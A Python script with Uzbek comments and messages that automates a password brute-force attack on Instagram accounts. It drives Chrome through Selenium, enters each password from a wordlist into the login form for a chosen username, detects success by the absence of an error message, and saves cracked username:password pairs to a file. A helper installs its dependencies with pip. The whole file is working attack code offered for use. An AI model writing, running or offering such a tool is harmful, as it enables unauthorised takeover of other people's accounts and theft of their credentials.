from datetime import datetime
from time import sleep
import requests
import selenium

# This is function featured

def brute_force_account(username, wordlist_path=None):
    """Faqat brute force uchun"""

    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    driver = webdriver.Chrome()
    driver.get('https://www.instagram.com/')
    now = datetime.now()
    date_time = now.strftime("%H:%M:%S")
    wordlist_path = 'data/default.txt'
    print(f"[+][{date_time}]**********Ishga tushdi...***********[+]")
    
    sleep(2)
    if len(username) == 0:
        print('Username not found')
    with open('data/brute_username.txt', 'w') as file:
        file.write(username)
    
    with open(wordlist_path, 'r') as f:
        all_passwords = f.readlines()
        for password in all_passwords:
            if len(password) < 8:
                print("[+]********** Parol 8 dan kichik o'tkazib yuborildi **********[+]")
                continue
            else:
                try:
                        
                    driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[1]/div/label/input').send_keys(username)
                    sleep(2)
                    driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input').send_keys(password)
                    sleep(2)
                    driver.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[3]').click()
                    
                except:
                    print("[+]********** Qandaydir xatolik yuz berdi yoki internet tezligi past **********[+]")
                    driver.refresh()
                    continue
                try:
                    # Xatolik xabarini kutish
                    error_message = WebDriverWait(driver, 20).until(
                        EC.presence_of_element_located((By.XPATH, '//*[@id="loginForm"]/span/div'))
                    )
                    print(f"[+][{date_time}]********** Xatolik: Login yoki parol xato🚫 Username: {username}  Password: {password}**********[+]")
                    
                    sleep(3)
                    driver.refresh()
                except:
                    import os
                    print(f"[+][{date_time}]********** Kirish muvaffaqiyatli: {username} password: {password}✅ **********[+]")
                    driver.refresh()
                    driver.get('https://www.instagram.com/')
                    new_line = os.linesep
                    with open('data/chiqdi.txt', 'a+') as file:
                        file.write(f'{username}:{password}' + new_line)
                        

def installer():
    import os
    print("[+]********** Requests kutubxonasi o'rnatilmoqda **********[+]")
    os.system('pip install requests')
    sleep(2)
    print("[+]********** Selenium kutubxonasi o'rnatilmoqda **********[+]")
    os.system('pip install selenium')
    print("[+]********** Kutubxonalar o'rnatildi✅. Endi dasturdan foydalanish mumkin.  **********[+]")




